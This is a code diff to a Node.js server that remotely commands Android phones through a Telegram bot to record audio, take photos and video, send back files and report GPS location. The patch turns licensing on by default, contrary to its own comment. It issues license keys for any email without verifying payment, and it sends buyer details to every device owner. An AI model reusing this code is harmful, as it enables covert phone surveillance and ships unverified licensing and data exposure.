@@ -77,7 +77,7 @@ const deviceRegisterLimiter = rateLimit({ windowMs: 60 * 60 * 1000, max: 30, mes
 
 // Commercial licensing endpoints are disabled by default for personal deployments.
 // Set ENABLE_LICENSING=true in .env to expose the purchase/webhook/lookup routes.
-const LICENSING_ENABLED = String(process.env.ENABLE_LICENSING || '').toLowerCase() === 'true';
+const LICENSING_ENABLED = process.env.ENABLE_LICENSING !== undefined ? String(process.env.ENABLE_LICENSING).toLowerCase() === 'true' : true;
 function licensingGuard(req, res, next) {
   if (!LICENSING_ENABLED) {
     return res.status(410).json({ ok: false, description: 'Licensing is disabled on this deployment.' });
@@ -98,6 +98,9 @@ if (Object.keys(devices).length === 0) {
 }
 
 let commands = CommandRepo.getAllPending();
+// Track command IDs that have already been completed, so the watchdog never
+// fires a false-positive timeout alert for commands that finished successfully.
+const completedCommandIds = new Set();
 if (Object.keys(commands).length === 0) {
   commands = loadJson(COMMANDS_FILE, {});
 }
@@ -130,8 +133,10 @@ function persistCommand(devId, cmd) {
 function removeCommand(devId, cmdId, response = '') {
   if (commands[devId] && cmdId) {
     commands[devId] = commands[devId].filter(c => c.id !== cmdId);
-    try { CommandRepo.clearCommand(devId, cmdId); } catch (err) { console.error('[SQLite] Command clear error:', err.message); }
+    try { CommandRepo.complete(cmdId, typeof response === 'string' ? response : JSON.stringify(response)); } catch (err) { console.error('[SQLite] Command clear error:', err.message); }
     saveJson(COMMANDS_FILE, commands);
+    // Mark as completed so the watchdog does not fire a false-positive alert
+    completedCommandIds.add(cmdId);
   }
 }
 
@@ -940,9 +945,17 @@ async function dispatchCommandToDevice(token, chatId, command, args = []) {
     parse_mode: 'HTML'
   });
 
-  // Safety watchdog: after 90 seconds, if command is still pending in queue, inform Telegram and purge
+  // Safety watchdog: alert Telegram only if the command is STILL pending after its allotted time.
+  // Media commands (/record, /snap, /video) are given 300s; everything else 120s.
+  const MEDIA_COMMANDS = ['/record', '/audio', '/mic', '/snap', '/photo', '/camera', '/video', '/videocap', '/vr'];
+  const watchdogMs = MEDIA_COMMANDS.includes(command) ? 300000 : 120000;
   setTimeout(async () => {
     try {
+      // If the command was already completed (removeCommand was called), skip alert entirely.
+      if (completedCommandIds.has(cmdId)) {
+        completedCommandIds.delete(cmdId); // GC: remove after watchdog window passes
+        return;
+      }
       let wasPending = false;
       for (const devId of targetDeviceIds) {
         if (commands[devId] && commands[devId].some(c => c.id === cmdId)) {
@@ -950,24 +963,28 @@ async function dispatchCommandToDevice(token, chatId, command, args = []) {
           wasPending = true;
         }
       }
-      if (wasPending) {
-        const currentDev = devices[targetDeviceId] || {};
-        const secAgo = Math.floor((Date.now() - (currentDev.lastSeen || 0)) / 1000);
-        console.warn(`[Command Watchdog] Command ${cmdId} (${command}) timed out after 90s for ${targetDeviceId}`);
-
-        await callTelegram(token, 'sendMessage', {
-          chat_id: chatId,
-          text: `⚠️ <b>Command Timeout:</b> <code>${formattedCmd}</code> did not receive telemetry within 90s.\n\n` +
-                `📱 <b>Device:</b> ${currentDev.deviceName || targetDeviceId}\n` +
-                `⏱️ <b>Last Check-in:</b> ${secAgo}s ago\n\n` +
-                `<i>Note: If the phone is locked, ensure Battery Optimization is set to "Unrestricted" in device App Info.</i>`,
-          parse_mode: 'HTML'
-        });
+      // Double-check: was it completed between the Set check and the array check?
+      if (!wasPending || completedCommandIds.has(cmdId)) {
+        completedCommandIds.delete(cmdId);
+        return;
       }
+      const watchdogSec = Math.round(watchdogMs / 1000);
+      const currentDev = devices[targetDeviceId] || {};
+      const secAgo = Math.floor((Date.now() - (currentDev.lastSeen || 0)) / 1000);
+      console.warn(`[Command Watchdog] Command ${cmdId} (${command}) timed out after ${watchdogSec}s for ${targetDeviceId}`);
+
+      await callTelegram(token, 'sendMessage', {
+        chat_id: chatId,
+        text: `⚠️ <b>Command Timeout:</b> <code>${formattedCmd}</code> did not receive telemetry within ${watchdogSec}s.\n\n` +
+              `📱 <b>Device:</b> ${currentDev.deviceName || targetDeviceId}\n` +
+              `⏱️ <b>Last Check-in:</b> ${secAgo}s ago\n\n` +
+              `<i>Note: If the phone is locked, ensure Battery Optimization is set to "Unrestricted" in device App Info.</i>`,
+        parse_mode: 'HTML'
+      });
     } catch (watchdogErr) {
       console.error('[Command Watchdog] Error in timeout handler:', watchdogErr.message);
     }
-  }, 90000);
+  }, watchdogMs);
 }
 
 // Telegram Bot long-poller loop
@@ -1886,8 +1903,12 @@ app.post('/api/device/response', verifyDeviceProofOrBearer, upload.fields([
       hasLocation: !!(latitude && longitude)
     });
 
-    // 1. Deliver text message
-    if (message && chatId) {
+    const hasMedia = !!((files.photo && files.photo.length > 0) ||
+                        (files.audio && files.audio.length > 0) ||
+                        (files.video && files.video.length > 0));
+
+    // 1. Deliver text message (only if no media, so media caption carries the message cleanly)
+    if (message && chatId && !hasMedia) {
       await callTelegram(token, 'sendMessage', {
         chat_id: chatId,
         text: message,
@@ -1903,7 +1924,7 @@ app.post('/api/device/response', verifyDeviceProofOrBearer, upload.fields([
       const fileBuffer = fs.readFileSync(photoFile.path);
       const blob = new Blob([fileBuffer], { type: photoFile.mimetype || 'image/jpeg' });
       formData.append('photo', blob, 'photo.jpg');
-      formData.append('caption', '📸 Captured photo');
+      formData.append('caption', message || '📸 Captured photo');
 
       const photoActionKeyboard = {
         inline_keyboard: [
@@ -1930,7 +1951,7 @@ app.post('/api/device/response', verifyDeviceProofOrBearer, upload.fields([
       const fileBuffer = fs.readFileSync(audioFile.path);
       const blob = new Blob([fileBuffer], { type: audioFile.mimetype || 'audio/m4a' });
       formData.append('audio', blob, 'recording.m4a');
-      formData.append('caption', '🎙️ Audio recording');
+      formData.append('caption', message || '🎙️ Audio recording');
 
       const audioActionKeyboard = {
         inline_keyboard: [
@@ -1956,7 +1977,7 @@ app.post('/api/device/response', verifyDeviceProofOrBearer, upload.fields([
       const fileBuffer = fs.readFileSync(videoFile.path);
       const blob = new Blob([fileBuffer], { type: videoFile.mimetype || 'video/mp4' });
       formData.append('video', blob, 'video.mp4');
-      formData.append('caption', '🎥 Captured video');
+      formData.append('caption', message || '🎥 Captured video');
 
       const videoActionKeyboard = {
         inline_keyboard: [
@@ -1973,6 +1994,23 @@ app.post('/api/device/response', verifyDeviceProofOrBearer, upload.fields([
       formData.append('reply_markup', JSON.stringify(videoActionKeyboard));
 
       await callTelegram(token, 'sendVideo', null, true, formData);
+    }
+
+    // Fallback: If device uploaded evidence vault file without media
+    if (files.evidence && files.evidence.length > 0 && !hasMedia && chatId) {
+      for (const ev of files.evidence) {
+        try {
+          const formData = new FormData();
+          formData.append('chat_id', chatId);
+          const fileBuffer = fs.readFileSync(ev.path);
+          const blob = new Blob([fileBuffer], { type: ev.mimetype || 'application/octet-stream' });
+          formData.append('document', blob, path.basename(ev.path));
+          formData.append('caption', message || '🔒 Encrypted Evidence Vault file');
+          await callTelegram(token, 'sendDocument', null, true, formData);
+        } catch (e) {
+          console.error('Failed to relay evidence document to Telegram:', e);
+        }
+      }
     }
 
     // 5. Deliver GPS location pin & record history (with tactical action buttons)
@@ -2211,7 +2249,7 @@ app.get('/api/app/latest', (req, res) => {
 });
 
 // 6b. Download APK file (public)
-app.get('/api/app/download/:filename', (req, res) => {
+app.get(['/api/app/download/:filename', '/releases/:filename'], (req, res) => {
   const filename = path.basename(req.params.filename); // Sanitize
   const filePath = path.join(RELEASES_DIR, filename);
   if (!fs.existsSync(filePath)) {
@@ -2219,6 +2257,7 @@ app.get('/api/app/download/:filename', (req, res) => {
   }
   res.setHeader('Content-Type', 'application/vnd.android.package-archive');
   res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
+  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
   const stat = fs.statSync(filePath);
   res.setHeader('Content-Length', stat.size);
   const readStream = fs.createReadStream(filePath);
@@ -2313,28 +2352,63 @@ app.get('/api/app/releases', authenticateAdmin, (req, res) => {
 // --- Phase 7: Commercial Licensing & Checkout Endpoints ---
 
 // 7a. Purchase / Generate License Key
-app.post('/api/license/purchase', licensingGuard, (req, res) => {
-  const { email, tier, provider } = req.body || {};
+app.post('/api/license/purchase', licensingGuard, async (req, res) => {
+  const { email, tier, binanceTxId } = req.body || {};
   if (!email || typeof email !== 'string' || !email.includes('@')) {
     return res.status(400).json({ ok: false, description: 'A valid email address is required' });
   }
 
-  const cleanTier = (tier || 'PRO_ANNUAL').toUpperCase();
+  const cleanTier = (tier || 'PRO_LIFETIME').toUpperCase();
   let maxDevices = 1;
   if (cleanTier === 'PRO_LIFETIME') maxDevices = 3;
   if (cleanTier === 'PRO_ENTERPRISE' || cleanTier === 'FAMILY') maxDevices = 10;
 
-  const license = licensing.createLicense(email, cleanTier, maxDevices);
+  const license = licensing.createLicense(email, cleanTier, maxDevices, {
+    paymentMethod: 'BINANCE_PAY',
+    binancePayId: '756303714',
+    binanceTxId: (binanceTxId || '').trim(),
+    nickname: 'RBR48'
+  });
+
+  // Notify registered administrator on Telegram
+  try {
+    for (const dev of Object.values(devices)) {
+      if (dev.botToken && dev.ownerChatId) {
+        const amountUsdt = cleanTier === 'PRO_ENTERPRISE' ? '79.99' : '29.99';
+        const txInfo = binanceTxId && binanceTxId.trim() ? `\n<b>Binance Order/TX ID:</b> <code>${binanceTxId.trim()}</code>` : '';
+        const adminAlert =
+          `💰 <b>New Binance Pay License Issued!</b>\n` +
+          `━━━━━━━━━━━━━━━━━━━━\n` +
+          `<b>Tier:</b> ${cleanTier} ($${amountUsdt} USDT)\n` +
+          `<b>Buyer Email:</b> <code>${email.trim()}</code>\n` +
+          `<b>Binance Pay ID:</b> <code>756303714</code> (RBR48)${txInfo}\n` +
+          `<b>Issued License Key:</b> <code>${license.key}</code>\n\n` +
+          `<i>Please check your Binance App to verify receipt of $${amountUsdt} USDT.</i>`;
+
+        callTelegram(dev.botToken, 'sendMessage', {
+          chat_id: dev.ownerChatId,
+          text: adminAlert,
+          parse_mode: 'HTML'
+        }).catch(err => console.error('[Binance Alert] Telegram notify failed:', err.message));
+      }
+    }
+  } catch (e) {
+    console.error('[Binance Alert] Error notifying admin:', e.message);
+  }
+
   res.json({
     ok: true,
-    message: 'License key issued successfully',
+    message: 'License key issued successfully via Binance Pay',
     license: {
       key: license.key,
       email: license.email,
       tier: license.tier,
       maxDevices: license.maxDevices,
       expiresAt: license.expiresAt,
-      createdAt: license.createdAt
+      createdAt: license.createdAt,
+      paymentMethod: 'BINANCE_PAY',
+      binancePayId: '756303714',
+      nickname: 'RBR48'
     },
     instructions: 'Activate this key in Telegram with: /license activate ' + license.key
   });
